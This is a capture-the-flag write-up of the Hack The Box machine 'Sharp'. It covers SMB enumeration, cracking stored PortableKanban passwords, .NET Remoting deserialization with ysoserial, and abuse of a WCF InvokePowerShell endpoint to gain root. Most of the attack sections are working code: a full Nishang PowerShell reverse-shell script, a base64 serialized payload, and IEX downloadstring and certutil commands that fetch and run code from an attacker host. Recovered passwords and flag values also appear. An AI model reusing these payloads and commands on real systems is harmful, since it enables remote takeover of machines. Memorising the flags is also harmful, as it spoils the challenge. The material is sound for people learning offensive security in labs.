# Sharp

## Enumeration 

### nmap 

![[Screenshot 2021-02-08 at 9.10.50 PM.png]]

### smb
Port 445, smb

`smbmap -H 10.10.10.219 -R`

![[Screenshot 2021-02-08 at 9.13.29 PM.png]]

Now get the files in the knaban directory. 

using command `smbget -R smb://10.10.10.219/kanban`

And just press enter for the root password.

![[Screenshot 2021-02-08 at 9.17.10 PM.png]]

Running `ack -i "password"` in the folder where we saved the binaries

![[Screenshot 2021-02-08 at 9.47.39 PM.png]]

Passwords from PortableKanban.pk3

`"Name":"lars","Initials":"","Email":"","EncryptedPassword":"Ua3LyPFM175GN8D3+tqwLA==","Role":"User"`

`"Name":"Administrator","Initials":"","Email":"","EncryptedPassword":"k+iUoOvQYG98PuhhRC7/rg==","Role":"Admin"`

### general
Create a zip of the files and transfer to a Windows VM and we have to run the binary PortableKanban.exe as said in the User Guide.

Trying the exe we got, fails on the password we got (as it is encrypted)
And there is another zip pkb.zip, extracting there is a fresh set of files.

![[Screenshot 2021-02-08 at 10.16.43 PM.png]]

copy the PortableKanban.pk3.bak from the one we got, and we got the a pop up that we have restored from PortableKanban.pk3.bak

And before running the exe remove the admin password from the copied PortableKanban.pk3.bak, then run the exe 


![[Screenshot 2021-02-08 at 10.19.29 PM.png]]


log-in as Administrator, no password required.

go to setting, and user

![[Screenshot 2021-02-08 at 10.45.30 PM.png]]

un-check the hide passwords 

![[Screenshot 2021-02-08 at 10.49.57 PM.png]]

got the lars password : G123HHrth234gRG

Now delete the old pkb folder, get a new fresh one. Again copy the pk3 file and make lars as admin!

[[Screenshot 2021-02-08 at 10.55.11 PM.png]]

This time login as lars use the password: G123HHrth234gRG

and we got the Admin password as well
![[Screenshot 2021-02-08 at 10.57.38 PM.png]]

Admin  passwd : G2@$btRSHJYTarg

Back to Kali VM

Trying the admin passwd in the smb but not valid but lars one works.

`smbmap -u lars -p G123HHrth234gRG -H 10.10.10.219`

![[Screenshot 2021-02-08 at 11.07.20 PM.png]]

Getting the fiels in dev folder

`smbget -R smb://10.10.10.219/dev/ -U lars%G123HHrth234gRG`

![[Screenshot 2021-02-08 at 11.08.29 PM.png]]

Create zip and back to Windows VM.

![[Screenshot 2021-02-11 at 10.52.42 AM.png]]

Lets debug to see whats in them 

Using [dnSpy](https://github.com/dnSpy/dnSpy) to decompile the exe.

Open the exe and set the break point at starting. 

On debugging I found the username and password. 

![[Screenshot 2021-02-11 at 10.59.21 AM.png]]

![[Screenshot 2021-02-11 at 10.58.55 AM.png]]

Username : debug
Password : SharpApplicationDebugUserPassword123!

tcp://localhost:8888/SecretSharpDebugApplicationEndpoint

On more debugging found that its using `System.Runtime.Remoting.Channels.Tcp`

![[Screenshot 2021-02-11 at 11.05.30 AM.png]]

## Exploit

So looking for its exploit. 

Raw:
https://github.com/tyranid/ExploitRemotingService

Use this the compiled one:
https://github.com/parteeksingh005/ExploitRemotingService_Compiled

Download OpenVPN for windows, [nc64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe), [nishang reverse tcp shell]( https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1), [ysoserial](https://github.com/pwntester/ysoserial.net/releases/download/v1.34/ysoserial-1.34.zip) to serialise the payload.

After downloading the Invoke-PowerShellTcp.ps1 add `Invoke-PowerShellTcp -Reverse -IPAddress IP -Port port` at the end. 

looks like: 

```PowerShell
function Invoke-PowerShellTcp

{

<#

.SYNOPSIS

Nishang script which can be used for Reverse or Bind interactive PowerShell from a target.

  

.DESCRIPTION

This script is able to connect to a standard netcat listening on a port when using the -Reverse switch.

Also, a standard netcat can connect to this script Bind to a specific port.

  

The script is derived from Powerfun written by Ben Turner & Dave Hardy

  

.PARAMETER IPAddress

The IP address to connect to when using the -Reverse switch.

  

.PARAMETER Port

The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

  

.EXAMPLE

PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

  

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on

the given IP and port.

  

.EXAMPLE

PS > Invoke-PowerShellTcp -Bind -Port 4444

  

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port.

  

.EXAMPLE

PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

  

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be

listening on the given IP and port.

  

.LINK

http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html

https://github.com/nettitude/powershell/blob/master/powerfun.ps1

https://github.com/samratashok/nishang

#>

\[CmdletBinding(DefaultParameterSetName\="reverse")\] Param(

  

\[Parameter(Position = 0, Mandatory = $true, ParameterSetName\="reverse")\]

\[Parameter(Position = 0, Mandatory = $false, ParameterSetName\="bind")\]

\[String\]

$IPAddress,

  

\[Parameter(Position = 1, Mandatory = $true, ParameterSetName\="reverse")\]

\[Parameter(Position = 1, Mandatory = $true, ParameterSetName\="bind")\]

\[Int\]

$Port,

  

\[Parameter(ParameterSetName\="reverse")\]

\[Switch\]

$Reverse,

  

\[Parameter(ParameterSetName\="bind")\]

\[Switch\]

$Bind

  

)

  

try

{

#Connect back if the reverse switch is used.

if ($Reverse)

{

$client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)

}

  

#Bind to the provided port if Bind switch is used.

if ($Bind)

{

$listener = \[System.Net.Sockets.TcpListener\]$Port

$listener.start()

$client = $listener.AcceptTcpClient()

}

  

$stream = $client.GetStream()

\[byte\[\]\]$bytes = 0..65535|%{0}

  

#Send back current username and computername

$sendbytes = (\[text.encoding\]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "\`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\`n\`n")

$stream.Write($sendbytes,0,$sendbytes.Length)

  

#Show an interactive PowerShell prompt

$sendbytes = (\[text.encoding\]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')

$stream.Write($sendbytes,0,$sendbytes.Length)

  

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)

{

$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding

$data = $EncodedText.GetString($bytes,0, $i)

try

{

#Execute the command on the target.

$sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )

}

catch

{

Write-Warning "Something went wrong with execution of command on the target."

Write-Error $\_

}

$sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '

$x = ($error\[0\] | Out-String)

$error.clear()

$sendback2 = $sendback2 + $x

  

#Return the results

$sendbyte = (\[text.encoding\]::ASCII).GetBytes($sendback2)

$stream.Write($sendbyte,0,$sendbyte.Length)

$stream.Flush()

}

$client.Close()

if ($listener)

{

$listener.Stop()

}

}

catch

{

Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."

Write-Error $\_

}

}

  

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.38 -Port 1234
```

Commands :

1. `ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c "powershell -c IEX(new-object net.webclient).downloadstring('http://10.10.14.38/Invoke-PowerShellTcp.ps1')"`
		
	- From here you will get a long sting in base 64 let's say it PAYLOAD for ref. 
	- PAYLOAD
	- `AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAG8vYyBwb3dlcnNoZWxsIC1jIElFWChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuMzg6ODAvSW52b2tlLVBvd2VyU2hlbGxUY3AucHMxJykGBwAAAANjbWQEBQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQdtZXRob2QwB21ldGhvZDEDAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCQgAAAAJCQAAAAkKAAAABAgAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGCwAAALACU3lzdGVtLkZ1bmNgM1tbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQYMAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoGDQAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5Bg4AAAAaU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MGDwAAAAVTdGFydAkQAAAABAkAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQ8AAAAJDQAAAAkOAAAABhQAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGFQAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKAQoAAAAJAAAABhYAAAAHQ29tcGFyZQkMAAAABhgAAAANU3lzdGVtLlN0cmluZwYZAAAAK0ludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGGgAAADJTeXN0ZW0uSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKARAAAAAIAAAABhsAAABxU3lzdGVtLkNvbXBhcmlzb25gMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JDAAAAAoJDAAAAAkYAAAACRYAAAAKCw==
`
	
2. `python3 -m http.server 80`
	

3. `nc64.exe -nlvp 1234`


4. `ExploitRemotingService.exe -s --user=debug --pass="SharpApplicationDebugUserPassword123!" tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint 
		raw  $PAYLOAD`

And will get errors

```
System.InvalidCastException: Unable to cast object of type 'System.Collections.Generic.SortedSet`1[System.String]' to type 'System.Runtime.Remoting.Messaging.IMessage'.
   at System.Runtime.Remoting.Channels.CoreChannel.DeserializeBinaryRequestMessage(String objectUri, Stream inputStream, Boolean bStrictBinding, TypeFilterLevel securityLevel)
   at System.Runtime.Remoting.Channels.BinaryServerFormatterSink.ProcessMessage(IServerChannelSinkStack sinkStack, IMessage requestMsg, ITransportHeaders requestHeaders, Stream requestStream, IMessage& responseMsg, ITransportHeaders& responseHeaders, Stream& responseStream)
```

Ignore it. And you will get an rev shell as lars, as the payload will be downloaded on the machine 

![[Screenshot 2021-02-11 at 5.51.33 PM.png]]

![[Screenshot 2021-02-11 at 5.51.50 PM.png]]

User flag === 97a2817416518ac0560af2240f08ad5c


## For ROOT

![[Screenshot 2021-02-11 at 5.57.47 PM.png]]

![[Screenshot 2021-02-11 at 6.00.00 PM.png]]

Zip the files. 
`Compress-archive -LiteralPath C:\users\lars\Documents\wcf -DestinationPath C:\users\lars\Documents\wcf.zip`
![[Screenshot 2021-02-11 at 6.34.37 PM.png]]

`move-item -path C:\users/lars\Documents\wcf.zip -destination C:\dev`

`net use X: \\10.10.10.219\dev`

lars: G123HHrth234gRG

![[Screenshot 2021-02-11 at 6.35.15 PM.png]]

Now we hvae the access to the waf.zip file

![[Screenshot 2021-02-11 at 6.38.06 PM.png]]

Analyze it using Visual Studio 

![[Screenshot 2021-02-11 at 8.58.13 PM.png]]

Add  `Console.WriteLine(client.InvokePowerShell("IEX(new-object net.webclient).downloadstring('http://10.10.14.38/Invoke-PowerShellTcp.ps1')"));` to Program.cs

Looks like:

```

using RemotingSample;

using System;

using System.ServiceModel;

  

namespace Client {

  

 public class Client

 {

 public static void Main() {

 ChannelFactory<IWcfService> channelFactory = new ChannelFactory<IWcfService>(

 new NetTcpBinding(SecurityMode.Transport),"net.tcp://localhost:8889/wcf/NewSecretWcfEndpoint"

 );

 IWcfService client = channelFactory.CreateChannel();

 Console.WriteLine(client.GetDiskInfo());

 Console.WriteLine(client.GetCpuInfo());

 Console.WriteLine(client.GetRamInfo());

Console.WriteLine(client.InvokePowerShell("IEX(new-object net.webclient).downloadstring('http://10.10.14.38/Invoke-PowerShellTcp.ps1')"));

 }

 }

}
```

![[Screenshot 2021-02-11 at 9.08.43 PM.png]]

Then Build the solution 

![[Screenshot 2021-02-11 at 9.10.19 PM.png]]

Build Output
![[Screenshot 2021-02-11 at 9.12.30 PM.png]]

Now transfer these binaries to the machine. 

Make sure to change the port in the `Invoke-PowerShellTcp.ps1` from the one before as we will be already using that port.

Transfer the binaries to the machine via `certutil` as it was the only thing present in the box. 

` certutil -urlcache -split -f "http://10.10.14.38/WcfClient.exe" WcfClient.exe`

` certutil -urlcache -split -f "http://10.10.14.38/WcfRemotingLibrary.dll" WcfRemotingLibrary.dll`

![[Screenshot 2021-02-11 at 9.31.31 PM.png]]

listen on the port. 

execute the command : `.\WcfClient.exe http://10.10.14.38/Invoke-PowerShellTcp.ps1`


got rev shell

![[Screenshot 2021-02-11 at 9.33.23 PM.png]]

Root flag === 1cb355d5c5fc943d2a94ade1aa7f6aba